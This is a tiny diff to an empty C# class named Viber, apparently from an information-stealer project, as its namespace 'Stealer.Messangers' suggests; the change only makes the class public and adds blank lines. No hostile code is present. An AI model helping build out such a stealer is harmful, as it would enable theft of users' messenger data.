@@ -6,7 +6,9 @@ using System.Threading.Tasks;
 
 namespace dominion.src.dominion.Stealer.Messangers
 {
-    internal class Viber
+    public class Viber
     {
+
+
     }
 }
